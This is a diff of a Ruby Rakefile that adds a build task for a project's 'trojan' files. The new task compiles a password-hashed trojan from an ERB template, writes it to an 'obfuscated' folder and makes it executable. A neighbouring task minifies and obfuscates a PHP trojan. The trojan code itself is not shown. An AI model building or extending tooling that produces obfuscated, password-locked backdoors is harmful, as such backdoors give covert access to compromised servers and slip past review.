@@ -27,7 +27,7 @@ namespace :build do
         puts 'Less compiled.'
     end
 
-    namespace :trojans do
+    namespace :trojan do
 
         desc "Compiles the trojan into a minified and obfuscated form."
         task :php do
@@ -47,6 +47,30 @@ namespace :build do
 
             # delete the temporary file
             File.delete('./trojans/plaintext/tmp.trojan.php')
+        end
+
+        desc "Compiles the trojan into a minified and obfuscated form."
+        task :ruby do
+            # calculate the password hash
+            locks[:two][:hash] = Digest::SHA1.hexdigest(locks[:two][:password] + locks[:two][:salt])
+
+            # compile the trojan's erb template
+            erb = ERB.new(File.read('./trojans/plaintext/trojan.rb.erb'), 0, '<>', 'buffer')
+
+            # write the erb result to a temporary file
+            #f = File.new('./trojans/plaintext/tmp.trojan.rb', 'w')
+            f = File.new('./trojans/obfuscated/o.rb', 'w')
+            f.write(erb.result(binding))
+            f.close
+
+            # set execute permissions on the trojan
+            File.chmod(0777, './trojans/obfuscated/o.rb')
+
+            # process the temporary file with the PHP minifier and obfuscator
+            #puts `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
+
+            # delete the temporary file
+            #File.delete('./trojans/plaintext/tmp.trojan.php')
         end
     end
 end
